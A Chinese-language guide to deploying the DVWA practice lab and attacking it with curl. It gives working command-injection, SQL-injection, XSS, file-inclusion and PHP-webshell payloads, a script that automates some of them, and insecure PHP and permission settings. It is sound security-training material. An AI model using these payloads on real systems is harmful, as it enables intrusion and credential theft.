# DVWA 部署和测试指南

## 概述

DVWA (Damn Vulnerable Web Application) 是一个用于安全测试和学习的漏洞靶场。本指南配合 `install_dvwa.sh` 脚本使用，适用于 Ubuntu 24.04 系统。

## 快速部署

### 1. 上传脚本到目标机器

```bash
scp install_dvwa.sh user@target:~/
```

### 2. 运行安装脚本

```bash
ssh user@target "sudo bash ~/install_dvwa.sh"
```

### 3. 初始化数据库

首次访问 `http://<IP>/dvwa/`，使用默认账号登录后点击 "Create / Reset Database"。

- 默认账号: `admin`
- 默认密码: `password`

## 脚本配置

脚本顶部可自定义以下变量：

```bash
DVWA_DB_USER="dvwa"           # 数据库用户名
DVWA_DB_PASS="dvwa_password"  # 数据库密码
DVWA_DB_NAME="dvwa"           # 数据库名
MYSQL_ROOT_PASS="root_password"  # MySQL root 密码
```

## 安装内容

脚本自动安装和配置：

| 组件 | 说明 |
|------|------|
| Apache2 | Web 服务器 |
| MariaDB | 数据库服务器 |
| PHP + 扩展 | php-mysqli, php-gd |
| DVWA | 从 GitHub 克隆最新版本 |

## 漏洞测试命令

以下命令用于测试 DVWA 各类漏洞。测试前需先登录并设置安全级别为 `low`。

### 准备工作：登录并设置安全级别

```bash
# 登录获取 session
TOKEN=$(curl -sL -c /tmp/cookies.txt -b /tmp/cookies.txt \
  "http://<IP>/dvwa/login.php" | grep -oP "user_token' value='\K[a-f0-9]+")

curl -sL -c /tmp/cookies.txt -b /tmp/cookies.txt -X POST \
  "http://<IP>/dvwa/login.php" \
  -d "username=admin&password=password&Login=Login&user_token=$TOKEN"

# 设置安全级别为 low
TOKEN=$(curl -sL -c /tmp/cookies.txt -b /tmp/cookies.txt \
  "http://<IP>/dvwa/security.php" | grep -oP "user_token' value='\K[a-f0-9]+")

curl -sL -c /tmp/cookies.txt -b /tmp/cookies.txt -X POST \
  "http://<IP>/dvwa/security.php" \
  -d "security=low&seclev_submit=Submit&user_token=$TOKEN"
```

### 测试 1: 命令注入 (Command Injection)

```bash
# 执行 id 命令
curl -sL -c /tmp/cookies.txt -b /tmp/cookies.txt -X POST \
  "http://<IP>/dvwa/vulnerabilities/exec/" \
  -d "ip=127.0.0.1;id&Submit=Submit" | grep -oE "uid=[0-9]+\([a-z-]+\).*"

# 预期输出: uid=33(www-data) gid=33(www-data) groups=33(www-data)

# 查看系统信息
curl -sL -c /tmp/cookies.txt -b /tmp/cookies.txt -X POST \
  "http://<IP>/dvwa/vulnerabilities/exec/" \
  -d "ip=127.0.0.1;uname -a&Submit=Submit"
```

### 测试 2: SQL 注入 (SQL Injection)

```bash
# 获取所有用户 (使用 OR 绕过)
curl -sL -c /tmp/cookies.txt -b /tmp/cookies.txt \
  "http://<IP>/dvwa/vulnerabilities/sqli/?id=1'+OR+'1'='1&Submit=Submit"

# UNION 注入获取用户名和密码哈希
curl -sL -c /tmp/cookies.txt -b /tmp/cookies.txt \
  "http://<IP>/dvwa/vulnerabilities/sqli/?id=1'+UNION+SELECT+user,password+FROM+users--+&Submit=Submit"

# 预期获取的密码哈希 (MD5):
# admin:    5f4dcc3b5aa765d61d8327deb882cf99 (password)
# gordonb:  e99a18c428cb38d5f260853678922e03 (abc123)
# 1337:     8d3533d75ae2c3966d7e0d4fcc69216b (charley)
# pablo:    0d107d09f5bbe40cade3de5c71e9e9b7 (letmein)
# smithy:   5f4dcc3b5aa765d61d8327deb882cf99 (password)
```

### 测试 3: 反射型 XSS (Reflected XSS)

```bash
# 注入 script 标签
curl -sL -c /tmp/cookies.txt -b /tmp/cookies.txt \
  "http://<IP>/dvwa/vulnerabilities/xss_r/?name=<script>alert('XSS')</script>"

# 预期输出包含: <script>alert('XSS')</script>
```

### 测试 4: 本地文件包含 (LFI)

```bash
# 读取 /etc/passwd
curl -sL -c /tmp/cookies.txt -b /tmp/cookies.txt \
  "http://<IP>/dvwa/vulnerabilities/fi/?page=/etc/passwd"

# 读取 Apache 配置
curl -sL -c /tmp/cookies.txt -b /tmp/cookies.txt \
  "http://<IP>/dvwa/vulnerabilities/fi/?page=/etc/apache2/apache2.conf"
```

### 测试 5: 存储型 XSS (Stored XSS)

```bash
# 在留言板注入 XSS
curl -sL -c /tmp/cookies.txt -b /tmp/cookies.txt -X POST \
  "http://<IP>/dvwa/vulnerabilities/xss_s/" \
  -d "txtName=Hacker&mtxMessage=<script>alert('Stored XSS')</script>&btnSign=Sign+Guestbook"
```

### 测试 6: 文件上传

```bash
# 创建 PHP webshell
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php

# 上传文件
curl -sL -c /tmp/cookies.txt -b /tmp/cookies.txt -X POST \
  "http://<IP>/dvwa/vulnerabilities/upload/" \
  -F "uploaded=@/tmp/shell.php" -F "Upload=Upload"

# 执行命令
curl -sL "http://<IP>/dvwa/hackable/uploads/shell.php?cmd=id"
```

## 安全级别说明

DVWA 提供四个安全级别：

| 级别 | 说明 |
|------|------|
| Low | 无防护，适合初学者 |
| Medium | 基础防护，可绕过 |
| High | 较强防护，需要技巧 |
| Impossible | 安全实现，用于对比学习 |

## 一键测试脚本

将以下内容保存为 `test_dvwa.sh`：

```bash
#!/bin/bash

TARGET="${1:-localhost}"
COOKIES="/tmp/dvwa_cookies.txt"

echo "=== DVWA 漏洞测试 ==="
echo "目标: $TARGET"
echo ""

# 登录
TOKEN=$(curl -sL -c $COOKIES -b $COOKIES "http://$TARGET/dvwa/login.php" | grep -oP "user_token' value='\K[a-f0-9]+")
curl -sL -c $COOKIES -b $COOKIES -X POST "http://$TARGET/dvwa/login.php" -d "username=admin&password=password&Login=Login&user_token=$TOKEN" -o /dev/null

# 设置 low 安全级别
TOKEN=$(curl -sL -c $COOKIES -b $COOKIES "http://$TARGET/dvwa/security.php" | grep -oP "user_token' value='\K[a-f0-9]+")
curl -sL -c $COOKIES -b $COOKIES -X POST "http://$TARGET/dvwa/security.php" -d "security=low&seclev_submit=Submit&user_token=$TOKEN" -o /dev/null

echo "[1] 命令注入测试:"
curl -sL -c $COOKIES -b $COOKIES -X POST "http://$TARGET/dvwa/vulnerabilities/exec/" -d "ip=127.0.0.1;id&Submit=Submit" | grep -oE "uid=[0-9]+\([a-z-]+\).*"
echo ""

echo "[2] SQL 注入测试:"
curl -sL -c $COOKIES -b $COOKIES "http://$TARGET/dvwa/vulnerabilities/sqli/?id=1'+OR+'1'='1&Submit=Submit" | grep -oE "First name:.*Surname:.*" | head -3
echo ""

echo "[3] XSS 测试:"
RESULT=$(curl -sL -c $COOKIES -b $COOKIES "http://$TARGET/dvwa/vulnerabilities/xss_r/?name=<script>alert(1)</script>" | grep -o "<script>alert(1)</script>")
[ -n "$RESULT" ] && echo "XSS 漏洞存在: $RESULT" || echo "XSS 测试失败"
echo ""

echo "[4] 文件包含测试:"
curl -sL -c $COOKIES -b $COOKIES "http://$TARGET/dvwa/vulnerabilities/fi/?page=/etc/passwd" | grep -E "^root:|^www-data:" | head -2
echo ""

echo "=== 测试完成 ==="
```

使用方法：

```bash
chmod +x test_dvwa.sh
./test_dvwa.sh 172.30.0.14
```

## 常见问题

### 1. 数据库连接失败

检查数据库用户权限：

```bash
sudo mysql -u root -p'root_password' -e "SHOW GRANTS FOR 'dvwa'@'localhost';"
```

重新创建用户：

```bash
sudo mysql -u root -p'root_password' -e "
DROP USER IF EXISTS 'dvwa'@'localhost';
CREATE USER 'dvwa'@'localhost' IDENTIFIED BY 'dvwa_password';
GRANT ALL PRIVILEGES ON dvwa.* TO 'dvwa'@'localhost';
FLUSH PRIVILEGES;"
```

### 2. 文件包含漏洞不工作

确保 PHP 配置正确：

```bash
sudo sed -i 's/allow_url_include = Off/allow_url_include = On/' /etc/php/*/apache2/php.ini
sudo systemctl restart apache2
```

### 3. 文件上传失败

检查目录权限：

```bash
sudo chmod 777 /var/www/html/dvwa/hackable/uploads
sudo chown www-data:www-data /var/www/html/dvwa/hackable/uploads
```

### 4. 重置 DVWA

访问 `http://<IP>/dvwa/setup.php`，点击 "Create / Reset Database"。

## 相关文件

- `install_dvwa.sh` - 自动安装脚本
- `test_dvwa.sh` - 一键测试脚本 (需自行创建)

## 免责声明

本工具仅用于授权的安全测试和教育目的。未经授权对系统进行渗透测试是违法行为。
